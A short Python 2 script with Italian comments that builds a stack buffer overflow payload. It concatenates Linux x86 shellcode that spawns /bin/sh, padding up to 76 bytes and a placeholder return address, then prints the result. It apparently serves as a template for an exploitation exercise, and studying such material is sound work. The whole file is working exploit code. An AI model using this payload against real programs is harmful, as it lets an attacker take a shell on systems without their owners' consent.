#!/usr/bin/python

# Parametri da impostare
length = 76
ret = '\x00\x00\x00\x00'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80";
padding = 'a' * (length - len(shellcode))

payload = shellcode + padding + ret
print payload
#print shellcode
